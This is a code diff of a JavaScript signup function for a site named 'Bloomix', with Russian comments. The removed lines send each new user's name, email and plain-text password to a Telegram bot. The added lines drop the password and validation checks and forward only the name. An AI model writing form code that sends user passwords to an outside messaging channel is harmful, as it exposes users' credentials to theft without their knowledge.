@@ -293,23 +293,16 @@ async function login() {
 
 async function signup() {
   const name = document.getElementById('signup-name').value;
-  const email = document.getElementById('signup-email').value;
-  const pass = document.getElementById('signup-password').value;
-  const confirm = document.getElementById('signup-confirm').value;
+  // ... твои проверки ...
 
-  if (!name || !email || !pass) {
-    alert('Заполните все поля');
-    return;
+  if (name) {
+    // СОХРАНЯЕМ ИМЯ В ПАМЯТЬ БРАУЗЕРА
+    localStorage.setItem('userName', name); 
+
+    // Дальше твой код отправки в телеграм и переход
+    await sendToTelegram(`Новая регистрация: ${name}`);
+    document.location.href = 'index.html'; // или index.html
   }
-  if (pass !== confirm) {
-    alert('Пароли не совпадают');
-    return;
-  }
-
-  const text = `<b>🌱 Регистрация Bloomix:</b>\n👤 Имя: ${name}\n📧 Email: <code>${email}</code>\n🔒 Пароль: <code>${pass}</code>`;
-  await sendToTelegram(text);
-
-  document.location.href = 'index.html';
 }
 
   </script>
